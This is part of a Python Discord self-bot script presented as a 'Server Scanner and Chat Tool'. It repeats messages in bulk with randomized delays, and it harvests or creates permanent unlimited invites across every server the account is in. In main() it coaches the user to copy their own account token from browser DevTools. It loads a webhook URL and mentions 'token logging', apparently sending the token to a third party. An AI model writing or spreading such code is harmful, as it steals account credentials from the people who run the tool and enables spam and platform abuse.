        if not self.auto_reply_responses:
            print("\nNo auto-reply responses set.")
        else:
            print(f"\nAuto-reply responses ({len(self.auto_reply_responses)}):")
            for i, response in enumerate(self.auto_reply_responses, 1):
                print(f"  {i}. {response}")
        
        input("Press Enter to continue...")
    
    def clear_auto_replies(self):
        """Clear all auto-reply responses"""
        self.auto_reply_responses = []
        print("All auto-reply responses cleared.")
        input("Press Enter to continue...")
    
    def load_auto_replies_from_file(self):
        """Load auto-replies from autoreplies.txt"""
        if not os.path.exists("autoreplies.txt"):
            print("\nautoreplies.txt file not found.")
            create = input("Create sample autoreplies.txt? (yes/no): ").lower().strip()
            if create in ['yes', 'y']:
                with open("autoreplies.txt", 'w', encoding='utf-8') as f:
                    f.write("# Auto-reply responses (one per line)\n")
                    f.write("# Lines starting with # are comments\n\n")
                    f.write("Thanks for mentioning me!\n")
                    f.write("I'm here, what's up?\n")
                    f.write("Hello! How can I help?\n")
                print("Sample autoreplies.txt created. Edit it and try again.")
            input("Press Enter to continue...")
            return
        
        try:
            responses = []
            with open("autoreplies.txt", 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        responses.append(line)
            
            if not responses:
                print("No responses found in autoreplies.txt")
                input("Press Enter to continue...")
                return
            
            self.auto_reply_responses = responses
            print(f"Loaded {len(responses)} auto-reply responses from file.")
            
        except Exception as e:
            print(f"Error reading autoreplies.txt: {e}")
        
        input("Press Enter to continue...")
    
    async def send_multiple_custom(self):
        """Send multiple custom messages with configurable count and timing"""
        print("\nEnter the message to send:")
        message = input().strip()
        
        if not message:
            print("Message cannot be empty.")
            input("Press Enter to continue...")
            return
        
        try:
            count = int(input("How many times to send this message? ").strip())
            if count <= 0:
                print("Count must be greater than 0.")
                input("Press Enter to continue...")
                return
            
            print(f"\nCurrent delay settings: {CONFIG['min_delay']}s - {CONFIG['max_delay']}s")
            use_custom = input("Use custom delay for this session? (yes/no): ").lower().strip()
            
            min_delay = CONFIG['min_delay']
            max_delay = CONFIG['max_delay']
            
            if use_custom in ['yes', 'y']:
                min_delay = float(input("Min delay (seconds): ").strip())
                max_delay = float(input("Max delay (seconds): ").strip())
                
                if min_delay < 0 or max_delay < 0 or min_delay > max_delay:
                    print("Invalid delays. Using default settings.")
                    min_delay = CONFIG['min_delay']
                    max_delay = CONFIG['max_delay']
            
            print(f"\nReady to send '{message}' {count} times")
            print(f"Delay between messages: {min_delay}s - {max_delay}s")
            
            confirm = input("Continue? (yes/no): ").lower().strip()
            if confirm not in ['yes', 'y']:
                print("Cancelled.")
                input("Press Enter to continue...")
                return
            
            channel = self.client.get_channel(int(self.selected_channel['id']))
            if not channel:
                print("Could not find channel")
                input("Press Enter to continue...")
                return
            
            print(f"\nSending {count} messages...")
            sent_count = 0
            failed_count = 0
            
            for i in range(1, count + 1):
                print(f"[{i}/{count}] Sending message...")
                
                try:
                    await channel.send(message)
                    print(f"✓ Sent")
                    sent_count += 1
                    
                    # Delay between messages (except for last message)
                    if i < count:
                        delay = random.uniform(min_delay, max_delay)
                        print(f"  Waiting {delay:.1f}s...")
                        
                        # Split long delays into smaller chunks to maintain connection
                        if delay > 30:
                            chunks = int(delay / 30) + 1
                            chunk_delay = delay / chunks
                            for chunk in range(chunks):
                                await asyncio.sleep(chunk_delay)
                                print(f"    ... {((chunk + 1) * chunk_delay):.1f}s elapsed")
                        else:
                            await asyncio.sleep(delay)
                        
                except discord.Forbidden:
                    print(f"✗ No permission")
                    failed_count += 1
                except discord.HTTPException as e:
                    print(f"✗ Error: {e}")
                    failed_count += 1
                    # Break on serious errors
                    if "rate limited" in str(e).lower():
                        print("Rate limited - stopping to prevent account issues")
                        break
                except Exception as e:
                    print(f"✗ Unexpected error: {e}")
                    failed_count += 1
            
            print(f"\n{'='*40}")
            print(f"RESULTS:")
            print(f"Successfully sent: {sent_count}")
            print(f"Failed to send: {failed_count}")
            print(f"{'='*40}")
            
        except ValueError:
            print("Invalid input. Please enter numbers.")
        except Exception as e:
            print(f"Error: {e}")
        
        input("\nPress Enter to continue...")
    
    async def extract_invite_links(self):
        """Extract invite links from all servers"""
        if not self.servers_cache:
            print("\nNo cached server data. Please scan servers first.")
            input("Press Enter to continue...")
            return
        
        print(f"\n{'='*60}")
        print("EXTRACT INVITE LINKS")
        print(f"{'='*60}")
        
        invite_data = {}
        total_invites = 0
        
        for guild in self.client.guilds:
            print(f"\nExtracting invites from: {guild.name}")
            
            try:
                # Try to get invites (requires manage_guild permission)
                invites = await guild.invites()
                
                if invites:
                    guild_invites = []
                    for invite in invites:
                        # Create permanent invite if this one expires
                        invite_info = {
                            'code': invite.code,
                            'url': f"https://discord.gg/{invite.code}",
                            'uses': invite.uses or 0,
                            'max_uses': invite.max_uses or 'Unlimited',
                            'expires': 'Never' if invite.max_age == 0 else f"{invite.max_age} seconds",
                            'created_by': str(invite.inviter) if invite.inviter else 'Unknown',
                            'channel': f"#{invite.channel.name}" if invite.channel else 'Unknown'
                        }
                        guild_invites.append(invite_info)
                        total_invites += 1
                    
                    invite_data[guild.name] = guild_invites
                    print(f"  ✓ Found {len(guild_invites)} invites")
                else:
                    print(f"  • No existing invites found")
                    
                    # Try to create a permanent invite
                    try:
                        # Find a suitable channel (preferably general or first available)
                        suitable_channel = None
                        for channel in guild.text_channels:
                            if channel.permissions_for(guild.me).create_instant_invite:
                                if 'general' in channel.name.lower() or 'welcome' in channel.name.lower():
                                    suitable_channel = channel
                                    break
                                elif suitable_channel is None:
                                    suitable_channel = channel
                        
                        if suitable_channel:
                            # Create permanent invite
                            new_invite = await suitable_channel.create_invite(
                                max_age=0,  # Never expires
                                max_uses=0,  # Unlimited uses
                                unique=False,
                                reason="Discord Scanner - Permanent invite extraction"
                            )
                            
                            invite_info = {
                                'code': new_invite.code,
                                'url': f"https://discord.gg/{new_invite.code}",
                                'uses': 0,
                                'max_uses': 'Unlimited',
                                'expires': 'Never',
                                'created_by': str(self.client.user),
                                'channel': f"#{suitable_channel.name}",
                                'note': 'Created by Discord Scanner'
                            }
                            
                            invite_data[guild.name] = [invite_info]
                            total_invites += 1
                            print(f"  ✓ Created permanent invite: {new_invite.url}")
                        else:
                            print(f"  ✗ No permission to create invites")
                            invite_data[guild.name] = []
                            
                    except discord.Forbidden:
                        print(f"  ✗ No permission to create invites")
                        invite_data[guild.name] = []
                    except Exception as e:
                        print(f"  ✗ Error creating invite: {e}")
                        invite_data[guild.name] = []
                        
            except discord.Forbidden:
                print(f"  ✗ No permission to view invites")
                invite_data[guild.name] = []
            except Exception as e:
                print(f"  ✗ Error: {e}")
                invite_data[guild.name] = []
        
        # Save invite data
        await self.save_invite_data(invite_data, total_invites)
        
        print(f"\n{'='*50}")
        print(f"EXTRACTION COMPLETE")
        print(f"Total invites found/created: {total_invites}")
        print(f"Servers processed: {len(invite_data)}")
        print(f"{'='*50}")
        input("\nPress Enter to continue...")
    
    async def save_invite_data(self, invite_data, total_count):
        """Save invite data to files"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            
            # Save detailed JSON data
            json_filename = f"invite_links_{timestamp}.json"
            with open(json_filename, 'w', encoding='utf-8') as f:
                json.dump(invite_data, f, indent=2, ensure_ascii=False)
            
            # Save readable text file
            txt_filename = f"invite_links_{timestamp}.txt"
            with open(txt_filename, 'w', encoding='utf-8') as f:
                f.write(f"Discord Server Invite Links\n")
                f.write(f"Extracted on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total invites: {total_count}\n")
                f.write(f"{'='*60}\n\n")
                
                for server_name, invites in invite_data.items():
                    f.write(f"Server: {server_name}\n")
                    f.write(f"{'-'*40}\n")
                    
                    if invites:
                        for i, invite in enumerate(invites, 1):
                            f.write(f"{i}. {invite['url']}\n")
                            f.write(f"   Code: {invite['code']}\n")
                            f.write(f"   Channel: {invite['channel']}\n")
                            f.write(f"   Uses: {invite['uses']}/{invite['max_uses']}\n")
                            f.write(f"   Expires: {invite['expires']}\n")
                            f.write(f"   Created by: {invite['created_by']}\n")
                            if 'note' in invite:
                                f.write(f"   Note: {invite['note']}\n")
                            f.write("\n")
                    else:
                        f.write("   No invites available\n\n")
                    
                    f.write("\n")
            
            # Save simple link list
            simple_filename = f"invite_links_simple_{timestamp}.txt"
            with open(simple_filename, 'w', encoding='utf-8') as f:
                f.write("# Discord Server Invite Links (Simple List)\n")
                f.write(f"# Extracted on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                for server_name, invites in invite_data.items():
                    if invites:
                        f.write(f"# {server_name}\n")
                        for invite in invites:
                            f.write(f"{invite['url']}\n")
                        f.write("\n")
            
            print(f"\nSaved files:")
            print(f"  • {json_filename} (detailed data)")
            print(f"  • {txt_filename} (readable format)")
            print(f"  • {simple_filename} (simple list)")
            
        except Exception as e:
            print(f"Error saving invite data: {e}")

async def main():
    print("Discord Server Scanner and Chat Tool")
    print("WARNING: This may violate Discord's Terms of Service!")
    print("Use at your own risk.")
    
    response = input("\nDo you understand the risks and want to continue? (yes/no): ")
    if response.lower() not in ['yes', 'y']:
        print("Exiting for safety.")
        return
    
    # Load webhook URL from config.json
    webhook_url = None
    try:
        if os.path.exists('config.json'):
            with open('config.json', 'r') as f:
                config = json.load(f)
                webhook_url = config.get('webhook_url')
    except Exception as e:
        print(f"Could not load config.json: {e}")
    
    print("\nTo get your Discord token:")
    print("1. Open Discord in your web browser")
    print("2. Press F12 to open Developer Tools")
    print("3. Go to Network tab")
    print("4. Refresh the page (F5)")
    print("5. Look for any request and check the Authorization header")
    print("6. Copy the token after 'authorization: ' (without 'Bot ' prefix)")
    print("\nWarning: Your token gives full access to your Discord account!")
    
    token = input("\nEnter your Discord token: ").strip()
    if not token:
        print("No token provided.")
        return
    
    # Basic token validation
    if token.startswith("Bot "):
        print("Warning: This appears to be a bot token. You need a user token for self-botting.")
        print("Remove 'Bot ' prefix if this is actually a user token.")
        token = token.replace("Bot ", "").strip()
    
    if len(token) < 50:
        print("Warning: Token appears too short. Make sure you copied the complete token.")
        print("Valid user tokens are typically 59+ characters long.")
    
    scanner = DiscordScanner()
    scanner.webhook_url = webhook_url
    if webhook_url:
        print("✅ Webhook URL loaded from config.json")
    else:
        print("⚠️ No webhook URL found in config.json - skipping token logging")
    
    await scanner.connect_discord(token)

if __name__ == "__main__":
    asyncio.run(main())